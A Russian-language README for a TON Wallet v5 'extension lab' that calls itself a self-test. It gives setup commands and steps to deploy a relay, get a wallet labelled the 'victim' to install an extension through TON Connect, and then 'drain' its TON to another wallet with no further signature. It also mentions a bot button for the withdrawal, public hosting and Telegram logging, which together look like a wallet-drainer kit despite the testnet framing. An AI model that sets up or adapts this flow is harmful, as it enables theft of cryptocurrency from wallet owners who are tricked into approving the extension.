# W5 extension self-test

Два своих кошелька: **C (W5)** → один раз `add_extension` → **trigger** → TON на **B** без новой подписи C.

## Требования

- Кошелёk **C** в Tonkeeper = **Wallet v5** (Settings → Wallet version).
- **Testnet** сначала (`NETWORK_GLOBAL_ID=-3`, testnet TON на C и payer).
- **C (жертва)** — адрес в `WALLET_VICTIM` (рекомендуется, seed только в Tonkeeper).
- **B (получатель)** — `WALLET_B`.
- **Payer (gas)** — `MNEMONIC_TRIGGER` (отдельный кошелёk, не C).

## Поток по умолчанию: TON Connect

```bash
cd w5-extension-lab
cp .env.example .env
# WALLET_VICTIM = адрес C из Tonkeeper
# WALLET_B, MNEMONIC_TRIGGER — заполни
# MNEMONIC_A не нужен

npm install
npm run deploy
npm run manifest:local
npm run serve:public
```

1. Открой **http://127.0.0.1:8080/install.html** → Connect **кошельком C** → Install extension.
2. **http://127.0.0.1:8080/index.html** или **🔗 Списать через Tonkeeper** в боте — drain без подписи C.

Подробнее: **[DEPLOY-HOSTING.md](./DEPLOY-HOSTING.md)**, **[TONKEEPER.md](./TONKEEPER.md)**.

## Альтернатива: скрипт install

Если seed C лежит локально в `.env`:

```bash
npm run install-ext   # add_extension
npm run trigger       # или Tonkeeper / index.html
npm run remove-ext
```

## Проверка

- После install: [tonviewer](https://testnet.tonviewer.com) → C → Contract → `get_extensions` → relay EQ.
- После trigger: баланс **B** вырос на `DRAIN_AMOUNT` (минус fees).
- `npm run diag` — сводка в консоль + Telegram (если настроен logger).
